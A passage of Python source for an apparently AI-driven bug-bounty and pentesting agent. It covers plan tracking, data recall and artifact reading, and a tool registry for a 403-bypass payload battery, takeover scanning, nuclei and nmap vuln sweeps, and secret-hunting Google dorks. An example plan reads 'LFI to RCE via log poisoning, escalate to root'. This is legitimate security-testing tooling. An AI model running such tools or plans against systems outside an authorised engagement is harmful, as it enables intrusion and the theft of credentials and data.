        line = f"  {marker} {step.get('desc', '(no description)')}"
        if status == "blocked" and step.get("note"):
            line += f" — blocked: {step['note']}"
        lines.append(line)
    return "\n".join(lines)


def _execute_update_plan(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Sets or updates the persistent multi-step campaign plan for this
    target, stored in target.state['campaign_plan'] — survives target-IP
    migration (_migrate_target_state carries it forward), survives a gap
    between researcher messages, and is re-injected into every
    orchestrator turn via _format_campaign_plan_block, so the plan doesn't
    need to be re-explained or re-derived from chat history.

    Three actions:
      - "set": (re)defines the plan from scratch — goal + an ordered list
        of step descriptions, all starting "pending". Use when a
        multi-step objective first becomes clear (e.g. after initial
        recon surfaces 3-4 concrete attack paths worth tracking), not for
        a single simple action.
      - "update_step": marks ONE existing step done/blocked/pending by
        matching its description (substring match, case-insensitive) or
        its 0-based index. Call this as steps actually complete — don't
        batch updates at the end of a turn, the whole point is that a
        later turn (or the researcher checking in) sees real-time status.
      - "show": returns the current plan without changing anything.
    """
    action = str(args.get("action", "")).strip().lower()
    if action not in ("set", "update_step", "show"):
        return {"error": "update_plan needs an 'action': 'set', 'update_step', or 'show'."}

    state = target.state if (target and isinstance(target.state, dict)) else None
    if state is None:
        return {"error": "No target state available to store a plan against."}
    plan = state.get("campaign_plan")
    if not isinstance(plan, dict):
        plan = {"goal": "", "steps": []}

    if action == "show":
        return {"status": "success", "plan": plan}

    if action == "set":
        goal = str(args.get("goal", "")).strip()
        raw_steps = args.get("steps")
        if not goal or not isinstance(raw_steps, list) or not raw_steps:
            return {"error": "action='set' needs both a non-empty 'goal' and a non-empty 'steps' list (array of short step descriptions)."}
        plan = {
            "goal": goal,
            "steps": [{"id": i, "desc": str(s).strip(), "status": "pending", "note": ""} for i, s in enumerate(raw_steps) if str(s).strip()],
            "updated_at": datetime.now(timezone.utc).isoformat(),
        }
        state["campaign_plan"] = plan
        save_target(target)
        if emit and hasattr(emit, "info"):
            emit.info(f"[*] Campaign plan set: {goal} ({len(plan['steps'])} step(s))")
        return {"status": "success", "plan": plan}

    # action == "update_step"
    step_ref = args.get("step")
    new_status = str(args.get("status", "")).strip().lower()
    note = str(args.get("note", "")).strip()
    if step_ref is None or step_ref == "":
        return {"error": "action='update_step' needs 'step' (the step's description text, or its 0-based index)."}
    if new_status not in ("done", "blocked", "pending"):
        return {"error": "action='update_step' needs 'status' to be 'done', 'blocked', or 'pending'."}
    steps = plan.get("steps") or []
    if not steps:
        return {"error": "No plan steps exist yet — call action='set' first."}

    target_step = None
    try:
        idx = int(step_ref)
        if 0 <= idx < len(steps):
            target_step = steps[idx]
    except (TypeError, ValueError):
        pass
    if target_step is None:
        ref_lower = str(step_ref).strip().lower()
        for s in steps:
            if ref_lower in str(s.get("desc", "")).lower():
                target_step = s
                break
    if target_step is None:
        return {"error": f"No plan step matched '{step_ref}' — check the current steps with action='show' and match the wording more closely, or its index."}

    target_step["status"] = new_status
    target_step["note"] = note
    plan["updated_at"] = datetime.now(timezone.utc).isoformat()
    state["campaign_plan"] = plan
    save_target(target)
    if emit and hasattr(emit, "info"):
        emit.info(f"[*] Plan step marked {new_status}: {target_step.get('desc')}")
    return {"status": "success", "plan": plan}


_RECALL_CATEGORIES = {
    "endpoints": "state",
    "subdomains": "state",
    "live_hosts": "state",
    "js_routes": "state",
    "parameter_sensitive": "state",
    "takeover_candidates": "state",
    "technologies": "state",
    "credentials": "state",
    "secrets": "state",
    "failed_credentials": "state",
    "cookies": "state",
    "dismissed_false_positives": "state",
    "curl_evidence_log": "state",
    "campaign_plan": "state",
    "findings": "findings",  # lives on target.findings, not target.state
}


def _execute_recall_data(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Lets the model actively LOOK UP its own gathered data for this target,
    rather than being limited to whatever the orchestrator prompt's
    capped summary injects automatically (endpoints capped at 35,
    parameters at 15, curl evidence lookups matched by URL only, etc.).
    The injected summary is a rolling digest meant to fit in a prompt —
    this is the full, queryable version underneath it, for when the model
    needs to actually check "what did I already find here" instead of
    re-running recon that's already been done, especially useful right
    after a set_target (fresh turn, nothing in the trimmed chat history
    yet) or a same_target_as migration.

    Not a free-text search engine — a plain category lookup with an
    optional substring filter, same spirit as /output's "pull the full
    thing, not just what got streamed" but for structured state instead
    of raw tool output.
    """
    category = str(args.get("category", "")).strip().lower()
    if category not in _RECALL_CATEGORIES:
        return {
            "error": f"Unknown category '{category}'. Valid categories: {', '.join(sorted(_RECALL_CATEGORIES))}.",
        }
    source = _RECALL_CATEGORIES[category]
    if source == "findings":
        raw_items = target.findings if isinstance(target.findings, list) else []
    else:
        raw_items = target.state.get(category) if isinstance(target.state, dict) else None
        if isinstance(raw_items, dict):
            # e.g. campaign_plan, cookies -- not a list; return as-is, no filtering.
            return {"status": "success", "category": category, "data": raw_items}
        raw_items = raw_items if isinstance(raw_items, list) else []

    total = len(raw_items)
    filt = str(args.get("filter", "") or "").strip().lower()
    if filt:
        raw_items = [it for it in raw_items if filt in json.dumps(it, default=str).lower()]
    limit = min(int(args.get("limit", 50) or 50), 200)
    matched = len(raw_items)
    items = raw_items[-limit:] if matched > limit else raw_items

    # curl_evidence_log entries store their proof as one raw blended
    # string ("$ <command>\n\n<response>") — add the same Request/Response
    # split used in reports here too, so recalling evidence before writing
    # a finding shows it the same clean way it'll actually appear in the
    # report, not a harder-to-read raw dump.
    if category == "curl_evidence_log":
        items = [
            {**it, "formatted": _parse_evidence_text(it.get("raw", ""))} if isinstance(it, dict) else it
            for it in items
        ]

    return {
        "status": "success",
        "category": category,
        "total_stored": total,
        "matched": matched,
        "returned": len(items),
        "truncated": matched > len(items),
        "items": items,
    }


def _execute_set_target_stub(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Placeholder to satisfy ToolSpec's executor signature (args, target, emit)
    — that signature has no access to the Agent instance, but switching the
    active target (Agent.set_target) is an Agent-level operation, not a
    target-level one. The real implementation is Agent._execute_set_target,
    special-cased at the top of Agent.execute_tool_call (same pattern as the
    "internal memory tools operate locally" bypass just below it) so it runs
    with `self` in scope. This stub should never actually be reached; it
    exists only as a defensive fallback if some other code path ever calls
    TOOL_REGISTRY['set_target'].executor directly.
    """
    return {"error": "set_target must be routed through Agent.execute_tool_call, not called directly."}


def _execute_load_skill(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Loads a skill's full methodology content on demand, by name, from the skill menu."""
    name = str(args.get("name", "")).strip()
    if not name:
        return {"error": "name is required — see the SKILL MENU in your system prompt for available names."}
    registry = discover_skills()
    if name not in registry:
        available = ", ".join(sorted(registry.keys()))
        return {"error": f"No skill named '{name}'. Available: {available}"}
    body = load_skill_body(name)
    if not body:
        return {"error": f"Skill '{name}' has no content."}
    return {
        "skill": name,
        "content_type": "REFERENCE_DOCUMENTATION — not target data",
        "warning": (
            "Everything below is generic methodology reference material. It is NOT "
            "reconnaissance output and contains NO information about the current "
            "target. Any email address, domain, username, token, or identifier that "
            "appears in this content (e.g. 'admin@target.com', 'victim@x.com', "
            "'Admin@X.com') is a placeholder used to illustrate a technique's SYNTAX "
            "— it was never observed on the actual target and must NEVER be tested "
            "against it, submitted in a login/reset/API request, or reported as a "
            "'harvested' or 'discovered' credential. Only identifiers that appear in "
            "the response of an actual curl/spider/tool call against the real target "
            "are real. If this skill's methodology calls for a specific identifier "
            "(a username, an email), get it from your own prior tool results on this "
            "target, not from this document."
        ),
        "methodology": body,
    }


def _execute_read_artifact(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Reads a line-range slice of a raw tool output artifact saved under the target's raw/ directory."""
    path = str(args.get("path", "")).strip()
    if not path:
        return {"error": "path is required."}

    try:
        offset = int(args.get("offset", 0))
    except (ValueError, TypeError):
        offset = 0

    try:
        length = int(args.get("length", 200))
    except (ValueError, TypeError):
        length = 200

    target_name = target.name if (target and hasattr(target, "name") and target.name) else "default"
    base_dir = os.path.realpath(os.path.expanduser(f"~/.hellhound/targets/{target_name}/raw"))
    abs_path = os.path.realpath(os.path.expanduser(path))

    # Path traversal validation: path must be strictly within target's raw/ directory
    try:
        if os.path.commonpath([abs_path, base_dir]) != base_dir:
            return {"error": f"Access denied: Path '{path}' is not within target raw directory '{base_dir}'."}
    except Exception:
        return {"error": f"Access denied: Path '{path}' is outside target raw directory '{base_dir}'."}

    if not os.path.exists(abs_path) or not os.path.isfile(abs_path):
        return {"error": f"File not found: '{path}'."}

    try:
        with open(abs_path, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()

        total_lines = len(all_lines)
        start_line = max(0, offset)
        end_line = start_line + max(1, length)
        lines_slice = all_lines[start_line:end_line]
        content_slice = "".join(lines_slice)

        if emit and hasattr(emit, "info"):
            emit.info(f"[read_artifact] Reading lines {start_line}-{start_line + len(lines_slice)} from {os.path.basename(abs_path)}")

        return {
            "status": "success",
            "path": abs_path,
            "offset": start_line,
            "length": len(lines_slice),
            "total_lines": total_lines,
            "content": content_slice,
        }
    except Exception as e:
        return {"error": f"Failed to read artifact file '{path}': {e}"}


# Tool Registry Map
TOOL_REGISTRY: Dict[str, ToolSpec] = {
    "read_artifact": ToolSpec(
        name="read_artifact",
        description="Read a line-range slice of a raw tool output artifact saved to target storage (~/.hellhound/targets/<target>/raw/). Use this tool when previous tool output was truncated (indicated by [FULL OUTPUT SAVED: ...]) and you need to inspect a specific line range or middle section of the output.",
        parameters={
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Full file path of the saved raw artifact (e.g. ~/.hellhound/targets/example.com/raw/spider_20260828T120000.txt)."},
                "offset": {"type": "integer", "description": "Starting line number (0-indexed). Default is 0.", "default": 0},
                "length": {"type": "integer", "description": "Number of lines to read. Default is 200.", "default": 200}
            },
            "required": ["path"]
        },
        executor=_execute_read_artifact
    ),
    "load_skill": ToolSpec(
        name="load_skill",
        description="Load the full methodology for a named skill from the SKILL MENU in your system prompt. This is how you get methodology content — nothing is auto-injected for you. Check the menu and call this whenever a task would benefit from a specific methodology, before your first recon/exploit tool call.",
        parameters={
            "type": "object",
            "properties": {
                "name": {"type": "string", "description": "Exact skill name from the SKILL MENU, e.g. 'access-control', 'graphql-audit'."}
            },
            "required": ["name"]
        },
        executor=_execute_load_skill
    ),
    "record_finding": ToolSpec(
        name="record_finding",
        description="Log a finding you have ALREADY CONFIRMED (via curl/spider/other tools — not a plan or a guess) into the investigation's structured memory, so it persists across turns and feeds the running investigation summary. Use this once you've verified something real: a confirmed IDOR, a role you successfully escalated to, a token leak, etc. Do not use this to record intentions or untested hypotheses. CRITICAL: completing a normal, successful login/authentication with credentials you were legitimately given is NEVER itself a finding, no matter how technically involved the flow was (OAuth, SAML, SSO) — e.g. logging in as 'wiener' using the wiener:peter credentials the researcher gave you is just step one of the task, not a vulnerability. Only call this once you've demonstrated actual unauthorized impact: access to a DIFFERENT identity/account's data or privileges than the one whose credentials you used, an authorization check that should have blocked you but didn't, or similar. If what you have is 'I completed the intended login flow' and the researcher's actual objective (e.g. 'log in as carlos without his password') is still unmet, do not record a finding — keep working toward the real objective, or say plainly what's blocking you.",
        parameters={
            "type": "object",
            "properties": {
                "title": {"type": "string", "description": "One-line description of the confirmed finding, e.g. 'IDOR: account B's invoices readable from account A session'."},
                "kind": {"type": "string", "description": "Category, e.g. 'idor', 'auth_bypass', 'mass_assignment', 'interesting_endpoint'. Free text.", "default": "interesting_endpoint"},
                "severity": {"type": "string", "description": "Your assessed severity: critical, high, medium, or low.", "default": "medium"},
                "request_ref": {"type": "string", "description": "The URL/endpoint the finding applies to. If given, this call is BLOCKED unless a real request/response for this exact endpoint was actually captured this session (via the curl tool, or run_terminal_command running an HTTP-shaped command) — a finding with no real PoC attached is exactly what makes a report look like a false positive at triage. Omit only for a finding with no single endpoint (e.g. a weak SSH credential)."},
                "note": {"type": "string", "description": "Your own short analysis of why this confirms the finding. You do NOT need to retype raw request/response data here — the real request/response for this exact request_ref is captured automatically from requests already made this session and attached to the report; this field is for your interpretation, not for reconstructing evidence from memory."},
                "no_http_evidence_reason": {"type": "string", "description": "Only needed if request_ref is given but there's genuinely no HTTP request/response to show (a local privesc, a cracked SSH credential, something confirmed by direct observation). Explain why — this overrides the evidence gate. Never use this as a shortcut to skip actually re-running an HTTP PoC that's missing only because it was never tried through curl/run_terminal_command."}
            },
            "required": ["title"]
        },
        executor=_execute_record_finding
    ),
    "dismiss_finding": ToolSpec(
        name="dismiss_finding",
        description="Retract a finding the researcher has told you is NOT a real vulnerability — a false positive. Call this THE MOMENT the researcher says something you flagged isn't a bug, rather than just agreeing in your reply and leaving it sitting in findings. This removes it from recorded findings AND permanently stops record_finding from accepting the same kind+endpoint pair again on this target (citing your stated reason), AND writes a cross-target lesson so other targets with a similar stack benefit too. Match what you dismiss using the SAME title (or kind+request_ref) you originally used in record_finding.",
        parameters={
            "type": "object",
            "properties": {
                "title": {"type": "string", "description": "The exact (or close) title you used in record_finding for this finding, if there is one. Omit if you never got as far as record_finding and are dismissing a pattern/lead before recording it."},
                "kind": {"type": "string", "description": "Category, e.g. 'idor', 'sqli' — same value you used (or would have used) in record_finding. Required if title is omitted."},
                "request_ref": {"type": "string", "description": "The URL/endpoint this applies to. Required if title is omitted — required together with kind."},
                "reason": {"type": "string", "description": "REQUIRED. One sentence on WHY this isn't real — e.g. 'response content is dynamic/live (online user count, order totals) and differs between any two requests regardless of which user_id was passed — not evidence of per-user access control'. This exact reason is what prevents the same mistake from happening again, so be specific about the actual mechanism, not just 'false positive'."}
            },
            "required": ["reason"]
        },
        executor=_execute_dismiss_finding
    ),
    "update_plan": ToolSpec(
        name="update_plan",
        description=(
            "Set or update a persistent, multi-step campaign plan for the active target — stored in this "
            "target's own state, so it survives a target-IP migration (same_target_as), a gap between "
            "researcher messages, and doesn't need re-deriving from chat history on a later turn. Use "
            "action='set' once a multi-step objective becomes concrete (e.g. after recon surfaces several "
            "attack paths worth tracking: 'confirm the LFI, pivot to RCE via log poisoning, escalate to "
            "admin') — not for a single simple action. Use action='update_step' as each step actually "
            "completes or gets blocked, not batched at the end. This is what lets a later turn (or a "
            "researcher checking in after a break) see exactly what's done and what's next, instead of the "
            "model re-reading scrollback and guessing. It does NOT make the agent run unattended for hours "
            "without a new researcher message — it's cross-turn memory of intent, not a background scheduler."
        ),
        parameters={
            "type": "object",
            "properties": {
                "action": {"type": "string", "enum": ["set", "update_step", "show"], "description": "'set' (re)defines the whole plan, 'update_step' marks one step's status, 'show' just returns the current plan."},
                "goal": {"type": "string", "description": "Required for action='set'. One sentence: the overall objective this plan works toward."},
                "steps": {"type": "array", "items": {"type": "string"}, "description": "Required for action='set'. Ordered list of short step descriptions, e.g. ['Confirm LFI is still reachable after IP change', 'Escalate LFI to RCE via log poisoning', 'Record finding with full PoC', 'Attempt privilege escalation to root']."},
                "step": {"description": "Required for action='update_step'. The step's description text (substring match) or its 0-based index in the steps list."},
                "status": {"type": "string", "enum": ["done", "blocked", "pending"], "description": "Required for action='update_step'."},
                "note": {"type": "string", "description": "Optional for action='update_step' — why it's blocked, or any other short context."}
            },
            "required": ["action"]
        },
        executor=_execute_update_plan
    ),
    "recall_data": ToolSpec(
        name="recall_data",
        description=(
            "Look up the FULL set of a specific kind of data already gathered on the active target — not "
            "just the capped preview the orchestrator prompt injects automatically (e.g. only 35 endpoints, "
            "15 parameters are shown there). Use this before re-running recon that may have already been "
            "done, especially right after switching to this target (set_target, including a same_target_as "
            "IP migration) when the turn's history is fresh and the full picture isn't in front of you yet. "
            "Categories: endpoints, subdomains, live_hosts, js_routes, parameter_sensitive, "
            "takeover_candidates, technologies, credentials, secrets, failed_credentials, cookies, "
            "dismissed_false_positives, curl_evidence_log (captured request/response proof), campaign_plan, "
            "findings (confirmed findings on this target)."
        ),
        parameters={
            "type": "object",
            "properties": {
                "category": {"type": "string", "description": "One of the categories listed above."},
                "filter": {"type": "string", "description": "Optional substring to filter results by (case-insensitive, matched against each item's full content)."},
                "limit": {"type": "integer", "description": "Max items to return (default 50, hard-capped at 200). The result also reports total_stored/matched so you know if this is everything or a slice."}
            },
            "required": ["category"]
        },
        executor=_execute_recall_data
    ),
    "export_report": ToolSpec(
        name="export_report",
        description="Assemble every recorded finding and piece of evidence for this target into a single, self-contained, professional HTML report — headline, executive summary, per-finding impact statements and steps to reproduce, real captured request/response proof for each finding, and every referenced screenshot embedded directly in the file (base64, no linked images that break once the file leaves this machine — e.g. attached to a HackerOne/Bugcrowd submission). It ALSO auto-attaches a matching gowitness screenshot for a finding even when you didn't pass screenshot_refs, if one was captured earlier for that same endpoint — explicit screenshot_refs still wins when you give them. This writes TWO files from the exact same data: the HTML report, and a matching .md file (markdown_path in the result) — a GitHub-flavored Markdown version of the whole report, so you never need to retype/paste the report a second time into your chat reply when the researcher wants Markdown; just point them at both file paths. Use this at the end of a hunting session when the researcher asks for a report, a writeup, or to export/save findings — and call it again any time the researcher asks to update/add to the report; by default this OVERWRITES the target's one report file in place rather than creating a new one (see new_file). YOU write the narrative (title, executive summary, impact statement, steps to reproduce per finding) — follow the report-writing skill's methodology first (impact-first tone, CVSS 3.1 scoring, never 'could potentially' — prove it or don't claim it). Never fabricate example/placeholder evidence (made-up cookies, made-up response bodies, etc.) — this tool assembles and embeds what you give it faithfully, checks your work (every finding_ref must match something actually recorded via record_finding or logged as evidence during this session; fabricated/unmatched refs are rejected, any recorded finding you leave out gets flagged back to you), AND automatically attaches the real request/response captured during this session for each finding — you do not need to, and should not try to, retype that from memory.",
        parameters={
            "type": "object",
            "properties": {
                "report_title": {"type": "string", "description": "Report headline, e.g. 'IDOR in /api/v2/invoices/{id} allows any authenticated user to read any customer's invoice data'. Defaults to a generic title if omitted."},
                "executive_summary": {"type": "string", "description": "A short, impact-first summary of the overall engagement and its most significant findings."},
                "include_timeline": {"type": "boolean", "description": "Whether to append a full timestamped investigation timeline as an appendix. Default true.", "default": True},
                "new_file": {"type": "boolean", "description": "False (default): overwrite this target's single report file in place — re-running export_report after recording another finding or attaching more evidence updates the SAME file the researcher already has open, rather than producing a disconnected new one. Set true only when the researcher explicitly wants a separate timestamped snapshot (e.g. to keep a before/after-fix copy).", "default": False},
                "findings": {
                    "type": "array",
                    "description": "One object per finding to include, most severe first (order doesn't matter — sorted automatically).",
                    "items": {
                        "type": "object",
                        "properties": {
                            "finding_ref": {"type": "string", "description": "Must match (or closely match) the title of an existing record_finding entry or evidence card for this target — this is how the tool verifies the finding is real, not invented."},
                            "severity": {"type": "string", "description": "critical, high, medium, low, or info."},
                            "cvss_score": {"type": "string", "description": "e.g. '8.6 (High)'. Optional."},
                            "impact_statement": {"type": "string", "description": "Impact-first, proven (not speculative) description of what an attacker can actually do."},
                            "steps_to_reproduce": {"type": "array", "items": {"type": "string"}, "description": "One array entry per step, in order — e.g. ['Request a password reset for a known staff email...', 'Extract the token from the JSON response...', 'POST the token to /api/auth/reset...']. Each entry is rendered as its own numbered list item — do NOT prefix an entry with your own '1.'/'2)' marker, the numbering is added automatically and a manual prefix will show up doubled ('1. 1. ...'). Wrap a raw request/response in ``` fences within an entry to render it as a code block."},
                            "evidence_snippet": {"type": "string", "description": "Optional — your own narrative annotation of the evidence, if it adds something the raw data doesn't say on its own. Do NOT use this to reconstruct/retype a request or response from memory — the real, byte-for-byte captured request/response for each finding's request_ref is attached automatically from the curl calls already made this session. Never invent example/placeholder values (e.g. a made-up session cookie or a made-up response body) here or anywhere else in this call — if you don't actually have real evidence for something, leave it out rather than fabricating it."},
                            "screenshot_refs": {"type": "array", "items": {"type": "string"}, "description": "Filenames or paths of screenshots to embed for this finding (from gowitness output already captured for this target)."}
                        },
                        "required": ["finding_ref", "severity"]
                    }
                }
            },
            "required": ["findings"]
        },
        executor=_execute_export_report
    ),
    "gowitness": ToolSpec(
        name="gowitness",
        description="Capture high-fidelity visual web screenshots of URLs or endpoints using gowitness. Captures the FULL scrollable page by default (not just the visible viewport) so evidence below the fold — a patient records table, admin secrets, anything further down the page — isn't cut off. Automatically saves screenshots to target workspace (~/.hellhound/targets/<target>/screenshots/) and indexes them into target investigation memory & visual evidence cards. Supports session cookies & custom headers to screenshot authenticated member portals and admin dashboards for vulnerability PoC.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL to capture screenshot for (e.g. https://target.com/dashboard or https://target.com/admin)."},
                "urls": {"type": "array", "items": {"type": "string"}, "description": "Optional list of multiple target URLs to screenshot in batch."},
                "headers": {"type": "object", "description": "Optional custom HTTP headers (e.g. {'Cookie': 'session=abc123', 'Authorization': 'Bearer ...'})."},
                "cookies": {"type": "object", "description": "Optional session cookies dictionary or cookie string to screenshot authenticated pages."},
                "fullpage": {"type": "boolean", "description": "Capture the full scrollable page instead of just the visible viewport. Defaults to true — for evidence/PoC screenshots you almost always want everything on the page, not just what fits above the fold. Only set this to false if you specifically want a viewport-only shot (e.g. to show what a user sees without scrolling).", "default": True},
                "delay": {"type": "integer", "description": "Delay in seconds before capturing to allow JavaScript rendering (default: 2).", "default": 2},
                "output_dir": {"type": "string", "description": "Optional custom directory path to save screenshots (defaults to target workspace)."}
            },
            "required": ["url"]
        },
        executor=_execute_gowitness
    ),
    "subfinder": ToolSpec(
        name="subfinder",
        description="Enumerate subdomains for a domain using passive sources and certificate transparency logs. Relies on public indexing, so it will return nothing for domains that aren't publicly indexed — if that happens, consider dns_bruteforce or httpx instead. Subdomain enumeration only makes sense when the attack surface is actually unknown — do NOT call this when the researcher already gave a specific, fully-qualified target (a single host/URL, e.g. 'find an auth bypass on https://app.example.com/portal') and the goal doesn't call for discovering additional hosts; go straight at the given target instead.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target root domain to enumerate subdomains for."}
            },
            "required": ["domain"]
        },
        executor=_execute_subfinder
    ),
    "subdomain_sweep": ToolSpec(
        name="subdomain_sweep",
        description=(
            "\"Give me all live subdomains\" in ONE call instead of three: chains subfinder (passive OSINT) "
            "-> alterx (permutation mutations, e.g. dev-/staging-/api- prefixes) -> dnsx (bulk resolve), "
            "automatically feeding each stage's output into the next. Use this instead of calling subfinder, "
            "permute_subdomains, and resolve_candidates separately when the goal is simply the broadest live "
            "attack surface for a domain. Each stage still degrades gracefully on its own (a missing alterx "
            "just skips permutation with a note; subfinder's own findings still get resolved). Call subfinder/"
            "permute_subdomains/resolve_candidates individually instead when you specifically need to inspect "
            "or filter an intermediate stage's output before the next one runs."
        ),
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target root domain to sweep. Defaults to the active target."},
                "permute": {"type": "boolean", "description": "Generate and resolve permutation mutations (dev-, staging-, api-, etc.) on top of subfinder's passive results. Default true.", "default": True},
                "permute_limit": {"type": "integer", "description": "Max permutation candidates alterx generates before resolving. Default 300.", "default": 300},
            },
            "required": []
        },
        executor=_execute_subdomain_sweep
    ),
    "httpx": ToolSpec(
        name="httpx",
        description="Probe live web services, status codes, page titles, and web technology stack. For multiple hosts in one call, either a comma-separated string ('host1.com,host2.com') or a JSON array both work — pick whichever is natural.",
        parameters={
            "type": "object",
            "properties": {
                "target": {
                    "anyOf": [
                        {"type": "string"},
                        {"type": "array", "items": {"type": "string"}},
                    ],
                    "description": "Target domain, URL, a comma/whitespace-separated list of them in one string, or a JSON array of them.",
                }
            },
            "required": ["target"]
        },
        executor=_execute_httpx
    ),
    "subzy": ToolSpec(
        name="subzy",
        description="Verify CNAME records and test for potential dangling DNS subdomain takeover vulnerabilities.",
        parameters={
            "type": "object",
            "properties": {
                "subdomain": {"type": "string", "description": "Subdomain to verify for takeover vulnerability."}
            },
            "required": ["subdomain"]
        },
        executor=_execute_subzy
    ),
    "takeover_scanner": ToolSpec(
        name="takeover_scanner",
        description="Active CNAME/fingerprint-based subdomain takeover scanner targeting AWS, GitHub Pages, Heroku, Shopify, etc.",
        parameters={
            "type": "object",
            "properties": {
                "subdomains": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "List of subdomains to scan. Defaults to all active target subdomains."
                }
            }
        },
        executor=_execute_takeover_scanner
    ),
    "403_bypass": ToolSpec(
        name="403_bypass",
        description="Runs the bundled 403-bypass.sh payload battery (header spoofing, protocol/port tricks, HTTP method override, URL encoding, SQLi/WAF-bypass) against a URL currently returning 403/401 — fires the whole technique set in one call instead of you constructing each curl by hand. Returns only which payloads got a different (2xx) status code back; it does NOT confirm a real bypass. Every 2xx candidate returned here still needs individual manual verification — curl it yourself and read the actual response body — before it's a reportable finding. See the 403-bypass skill for the full methodology and its False-Positive Discipline checks.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The exact URL currently returning 403/401 to run the bypass battery against."},
                "mode": {
                    "type": "string",
                    "enum": ["header", "protocol", "port", "httpmethod", "encode", "sqli", "exploit"],
                    "description": "Which technique category to run. 'exploit' (default) runs everything. Narrow to one category (e.g. 'header') for a faster, more targeted pass once you have a specific reason to suspect that category.",
                    "default": "exploit"
                }
            },
            "required": ["url"]
        },
        executor=_execute_403_bypass
    ),
    "wayback_urls": ToolSpec(
        name="wayback_urls",
        description="Pulls archived URLs for a domain from the Wayback Machine's CDX API (web.archive.org) — free, no API key. Often surfaces old endpoints, params, and backup/config files that live crawlers (gau/katana) never see. Supports subdomain inclusion and filtering by sensitive file extensions or HTTP status codes.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to query archived URLs for."},
                "include_subdomains": {"type": "boolean", "description": "Include *.domain archived URLs, not just the apex.", "default": True},
                "extensions_only": {"type": "boolean", "description": "Only return URLs ending in a sensitive extension (sql, env, bak, config, pem, key, etc.).", "default": False},
                "status_codes": {"type": "string", "description": "Comma-separated HTTP status codes to include only (e.g. '200,301')."},
                "exclude_status_codes": {"type": "string", "description": "Comma-separated HTTP status codes to exclude (e.g. '404,500')."}
            },
            "required": ["domain"]
        },
        executor=_execute_wayback_urls
    ),
    "otx_urls": ToolSpec(
        name="otx_urls",
        description="Pulls passive URL intel for a domain from AlienVault OTX's free, no-API-key hostname/url_list endpoint. A different crawl/threat-intel source than wayback_urls/gau — worth running alongside them, not instead of.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to query OTX for."},
                "max_pages": {"type": "integer", "description": "Max pages of 500 results each to fetch.", "default": 10}
            },
            "required": ["domain"]
        },
        executor=_execute_otx_urls
    ),
    "urlscan_recon": ToolSpec(
        name="urlscan_recon",
        description="Searches urlscan.io's crawl index for a domain and extracts either discovered subdomains or discovered URLs from pages it has already scanned. Needs an urlscan.io API key configured via /apikey urlscan <key> (free key: https://urlscan.io/user/signup) or the URLSCAN_API_KEY env var.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to search urlscan.io for."},
                "mode": {"type": "string", "enum": ["subdomains", "urls"], "description": "Extract subdomains or full URLs from matching scans.", "default": "subdomains"}
            },
            "required": ["domain"]
        },
        executor=_execute_urlscan_recon
    ),
    "virustotal_lookup": ToolSpec(
        name="virustotal_lookup",
        description="Looks up a domain or IP in VirusTotal's v2 API: resolved hostnames (for an IP, revealing sibling hosts on shared infra) and previously-seen undetected URLs. Needs a VirusTotal API key via /apikey virustotal <key> (free key: https://www.virustotal.com/gui/my-apikey; comma-separate several keys there to rotate across the free-tier rate limit) or VT_API_KEY env var.",
        parameters={
            "type": "object",
            "properties": {
                "input": {"type": "string", "description": "Domain or IP address to look up."}
            },
            "required": ["input"]
        },
        executor=_execute_virustotal_lookup
    ),
    "google_dork": ToolSpec(
        name="google_dork",
        description="Runs a Google dork search, by default scoped to the active target with 'site:<domain> <query>'. Pass custom_query to run a fully custom dork instead (e.g. cross-target intext: searches). Google may rate-limit unauthenticated searches if called repeatedly in a short window.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to scope the dork to via site: — omit if custom_query is fully self-contained."},
                "query": {"type": "string", "description": "Dork terms appended after site:<domain> (e.g. 'filetype:env \"DB_PASSWORD\"')."},
                "custom_query": {"type": "string", "description": "A complete, self-contained dork query — overrides domain+query."},
                "num_results": {"type": "integer", "description": "Max results to return (1-100).", "default": 20}
            },
            "required": []
        },
        executor=_execute_google_dork
    ),
    "gau_nuclei_sweep": ToolSpec(
        name="gau_nuclei_sweep",
        description="Composite ACTIVE exposure sweep: gau passive URL fetch -> filter to param-bearing URLs -> dedup -> httpx live-check -> nuclei -dast against the live set. Sends real payloads (not just template matching) — subject to engagement no-automated-scanners/no-fuzzing/no-dos rules. Needs gau, httpx (or httpx-toolkit), and nuclei on PATH; uro is used if present but optional.",
        parameters={
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain to sweep."}
            },
            "required": ["domain"]
        },
        executor=_execute_gau_nuclei_sweep
    ),
    "nmap_service_scan": ToolSpec(
        name="nmap_service_scan",
        description="Deep service/vuln enumeration (nmap -sV -sC --script vuln,default) against a host's already-discovered open ports. Heavier and noisier than naabu's plain port_scan — run port_scan first, then pass its open ports here (or they're read automatically from target state if port_scan already ran). Subject to engagement no-automated-scanners/no-dos rules. NSE 'vuln' script hits are leads requiring manual verification, not confirmed findings.",
        parameters={
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Host or IP to scan."},
                "ports": {"type": "string", "description": "Comma-separated ports to scan (e.g. '80,443,8080'). If omitted, uses ports already discovered by port_scan for this host."}
            },
            "required": ["host"]
        },
        executor=_execute_nmap_service_scan
    ),
    "punycode_homoglyphs": ToolSpec(
        name="punycode_homoglyphs",
        description="Generates Unicode homoglyph/confusable variants of a single letter and their punycode (xn--) encodings — for IDN-homograph / typosquat-domain detection (brand-protection recon) and confusable-input test case generation. Pure local computation, no network calls, no scope restriction.",
        parameters={
            "type": "object",
            "properties": {
